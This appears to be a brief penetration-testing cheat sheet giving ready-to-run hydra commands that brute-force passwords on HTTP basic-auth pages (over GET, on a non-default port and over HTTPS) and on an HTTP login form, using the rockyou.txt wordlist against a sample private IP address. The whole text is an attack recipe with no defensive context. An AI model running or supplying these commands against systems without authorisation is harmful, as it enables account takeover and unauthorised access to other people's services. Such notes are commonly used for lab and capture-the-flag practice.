#### Bruteforce http pages only pop up pages
```bash
hydra -l bob -P rockyou.txt 10.49.188.83 http-get /protected

# If port is different
hydra -l bob -P /path/to/wordlist.txt 10.49.188.83 -s 8080 http-get /protected

# HTTPS
hydra -l bob -P /path/to/wordlist.txt https-get://10.49.188.83/protected

```
#### HTTP forms
```bash
hydra -l admin -P rockyou.txt <IP> http-post-form "/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid"
```
